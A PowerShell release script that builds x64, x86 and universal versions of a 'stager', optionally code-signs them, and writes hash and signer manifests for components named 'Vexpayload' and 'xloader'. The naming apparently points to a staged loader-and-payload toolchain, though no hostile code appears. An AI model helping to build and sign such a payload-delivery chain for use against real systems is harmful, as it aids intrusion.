# Production build: one universal stager, one manifest, one release directory.
param(
    [switch]$Test,
    [switch]$Sign,
    [string]$Pfx = "",
    [string]$PfxPassword = "",
    [string]$StageSeedFile = ""
)

$ErrorActionPreference = "Stop"
$Root = Split-Path -Parent $MyInvocation.MyCommand.Path
$Dist = Join-Path $Root "dist"
# Do not use Root\release: Windows is case-insensitive and that is the x86
# build output directory (Release).
$Release = Join-Path $Root "release-dist"
$Universal = Join-Path $Dist "universal_stager.exe"

function Step($name, [scriptblock]$body) {
    Write-Host "==> $name" -ForegroundColor Cyan
    & $body
    if ($LASTEXITCODE -ne 0) { throw "$name failed (exit $LASTEXITCODE)" }
}

$x64Args = @{}
if ($Test) { $x64Args.Test = $true }
if ($StageSeedFile) { $x64Args.StageSeedFile = $StageSeedFile }
if ($Sign) {
    if (-not $Pfx) { throw "-Sign requires -Pfx <certificate.pfx>" }
    $x64Args.Sign = $true
    $x64Args.Pfx = $Pfx
    $x64Args.PfxPassword = $PfxPassword
}
Step "x64 build" { & (Join-Path $Root "build.ps1") @x64Args }

$x86Args = @{}
if ($StageSeedFile) { $x86Args.StageSeedFile = $StageSeedFile }
if ($Sign) {
    $x86Args.Sign = $true
    $x86Args.Pfx = $Pfx
    $x86Args.Password = $PfxPassword
}
Step "x86 build" { & (Join-Path $Root "build_x86.ps1") @x86Args }

$uniArgs = @{}
if ($Test) { $uniArgs.Test = $true }
Step "universal build" { & (Join-Path $Root "build_universal.ps1") @uniArgs }

if ($Sign) {
    Step "sign universal" {
        & (Join-Path $Root "tools\sign.ps1") -Pfx $Pfx -Password $PfxPassword `
            -Targets @($Universal)
    }
    # The signature changes the universal hash; refresh the text record before
    # it is copied into release/.
    $uHash = (Get-FileHash $Universal -Algorithm SHA256).Hash
    $x64Hash = (Get-FileHash (Join-Path $Dist "stager.exe") -Algorithm SHA256).Hash
    $x86Hash = (Get-FileHash (Join-Path $Dist "stager_x86.exe") -Algorithm SHA256).Hash
    "universal: $((Get-Item $Universal).Length) bytes sha256 $uHash`r`nembedded x64: $x64Hash`r`nembedded x86: $x86Hash" |
        Set-Content (Join-Path $Dist "BUILD_UNIVERSAL.txt") -Encoding UTF8
}

function Entry([string]$path) {
    $item = Get-Item $path
    return [ordered]@{
        path = $item.FullName
        size = $item.Length
        sha256 = (Get-FileHash $path -Algorithm SHA256).Hash
    }
}

$uniJsonPath = [IO.Path]::ChangeExtension($Universal, ".json")
$uniMeta = Get-Content $uniJsonPath -Raw | ConvertFrom-Json
$signer = [ordered]@{}
foreach ($pair in @(
    @("payload_x64", (Join-Path $Dist "Vexpayload.exe")),
    @("payload_x86", (Join-Path $Dist "Vexpayload_x86.exe")),
    @("loader_x64", (Join-Path $Root "loader\x64\Release\xloader.exe")),
    @("loader_x86", (Join-Path $Root "loader\Release\xloader.exe")),
    @("universal", $Universal)
)) {
    $p = $pair[1]
    $sig = Get-AuthenticodeSignature $p
    $signer[$pair[0]] = [ordered]@{
        status = "$($sig.Status)"
        subject = if ($sig.SignerCertificate) { $sig.SignerCertificate.Subject } else { "" }
        thumbprint = if ($sig.SignerCertificate) { $sig.SignerCertificate.Thumbprint } else { "" }
    }
}

$manifest = [ordered]@{
    schema = 2
    build_utc = (Get-Date).ToUniversalTime().ToString("o")
    commit = (git -C $Root rev-parse --short HEAD)
    payload_x64 = Entry (Join-Path $Dist "Vexpayload.exe")
    payload_x86 = Entry (Join-Path $Dist "Vexpayload_x86.exe")
    loader_x64 = Entry (Join-Path $Root "loader\x64\Release\xloader.exe")
    loader_x86 = Entry (Join-Path $Root "loader\Release\xloader.exe")
    stager_x64 = Entry (Join-Path $Dist "stager.exe")
    stager_x86 = Entry (Join-Path $Dist "stager_x86.exe")
    universal = [ordered]@{
        path = (Get-Item $Universal).FullName
        size = (Get-Item $Universal).Length
        sha256 = (Get-FileHash $Universal -Algorithm SHA256).Hash
        embedded_x64_sha256 = $uniMeta.embedded.x64.sha256
        embedded_x86_sha256 = $uniMeta.embedded.x86.sha256
        resources = @(101, 102)
    }
    signer = $signer
}
$manifestJson = $manifest | ConvertTo-Json -Depth 8
[IO.File]::WriteAllText((Join-Path $Dist "BUILD_MANIFEST.json"), $manifestJson, [Text.UTF8Encoding]::new($false))

# Release contains exactly one payload artifact and its verification records.
if (Test-Path $Release) { Remove-Item $Release -Recurse -Force }
New-Item -ItemType Directory -Force -Path $Release | Out-Null
Copy-Item $Universal (Join-Path $Release "universal_stager.exe") -Force
Copy-Item (Join-Path $Dist "BUILD_UNIVERSAL.txt") (Join-Path $Release "BUILD_UNIVERSAL.txt") -Force
# The release manifest is portable: the universal entry is relative to release/.
$relManifest = Get-Content (Join-Path $Dist "BUILD_MANIFEST.json") -Raw | ConvertFrom-Json
$relManifest.universal.path = "universal_stager.exe"
$relManifest | ConvertTo-Json -Depth 8 |
    Set-Content (Join-Path $Release "BUILD_MANIFEST.json") -Encoding UTF8
$sums = @()
foreach ($f in @($Universal, (Join-Path $Release "BUILD_MANIFEST.json"), (Join-Path $Dist "BUILD_UNIVERSAL.txt"))) {
    $sums += "$((Get-FileHash $f -Algorithm SHA256).Hash) *$([IO.Path]::GetFileName($f))"
}
$sums | Set-Content (Join-Path $Release "SHA256SUMS.txt") -Encoding UTF8

Step "manifest verify" {
    python (Join-Path $Root "tools\verify_manifest.py") (Join-Path $Dist "BUILD_MANIFEST.json")
}
Step "release manifest verify" {
    python (Join-Path $Root "tools\verify_manifest.py") (Join-Path $Release "BUILD_MANIFEST.json")
}

Write-Host "==> release: $Release" -ForegroundColor Green
Get-ChildItem $Release | Select-Object Name, Length
